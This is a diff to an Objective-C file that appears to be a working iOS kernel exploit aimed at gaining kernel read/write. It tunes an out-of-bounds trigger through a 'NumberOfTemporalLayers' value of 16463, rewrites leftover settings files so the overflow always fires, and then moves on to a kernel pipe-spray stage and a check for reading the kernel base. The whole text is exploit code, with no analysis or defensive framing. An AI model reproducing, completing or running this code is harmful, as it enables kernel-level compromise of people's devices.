@@ -41,10 +41,11 @@
 #import <unistd.h>
 #import <errno.h>
 
-#define P149_BUILD     @"p149-t8150krw-v1"
+#define P149_BUILD     @"p149-t8150krw-v2"
 #define P149_KEY       @"NumberOfTemporalLayers"
 #define P149_PRE       8
 #define P149_OVER      16463
+#define P149_SURVIVE   16462
 #define P149_PIPES     96
 #define P149_CATCH     48
 #define P149_MAXPIPE   (P149_PIPES + P149_CATCH)
@@ -94,6 +95,35 @@ static long p149_read_knob(NSString *docs, NSString *name, long def) {
     return v;
 }
 
+/* Conversion TAP: 0 = 16462 survival; 16462..16464 = truth battery;
+   anything else (including the leftover p142_layers.txt=18 from the
+   09:06 / 09:55 HOLD taps) is forced to 16463 and the file is healed. */
+static long p149_layers_knob(NSString *docs) {
+    NSString *path = [docs stringByAppendingPathComponent:@"p142_layers.txt"];
+    NSString *s = [NSString stringWithContentsOfFile:path
+        encoding:NSUTF8StringEncoding error:nil];
+    if (!s) {
+        Lf(@"[*] no p142_layers.txt — layers=%d (PoC row)", P149_OVER);
+        return P149_OVER;
+    }
+    long v = strtol(s.UTF8String, NULL, 10);
+    if (v == 0) {
+        L(@"[*] p142_layers.txt=0 → 16462 survival control");
+        return P149_SURVIVE;
+    }
+    if (v >= P149_SURVIVE && v <= 16464) {
+        Lf(@"[*] p142_layers.txt=%ld (truth battery)", v);
+        return v;
+    }
+    Lf(@"[heal] p142_layers.txt=%ld is in-bounds leftover — forcing %d.",
+       v, P149_OVER);
+    L(@"  1..16461 cannot hit the 16463 OOB (this TAP 09:55 HOLD).");
+    L(@"  Writing 16463 so the container does not demote the next tap.");
+    [@"16463\n" writeToFile:path atomically:YES
+                   encoding:NSUTF8StringEncoding error:nil];
+    return P149_OVER;
+}
+
 @implementation P149T8150Krw
 
 + (NSString *)tap {
@@ -116,15 +146,10 @@ static long p149_read_knob(NSString *docs, NSString *name, long def) {
     L(@"  hasKread only on kread32(kbase)==0xfeedfacf.");
 
     long pre = p149_read_knob(docs, @"p142_pre.txt", P149_PRE);
-    long layers = p149_read_knob(docs, @"p142_layers.txt", P149_OVER);
-    if (layers == 0) layers = 16462; /* survival control, same as p142 */
     if (pre < 1 || pre > 8) pre = P149_PRE;
+    long layers = p149_layers_knob(docs);
     Lf(@"[*] knobs: pre=%ld (Prepare) layers=%ld (overshoot after Prepare)",
        pre, layers);
-    if (layers > 0 && layers < 16462) {
-        Lf(@"[HOLD] layers=%ld < 16462 — cannot hit the 16463 OOB. Encode still runs.",
-           layers);
-    }
 
     /* ---- stage 1: kernel pipe spray (held) ---- */
     int rfd[P149_MAXPIPE];
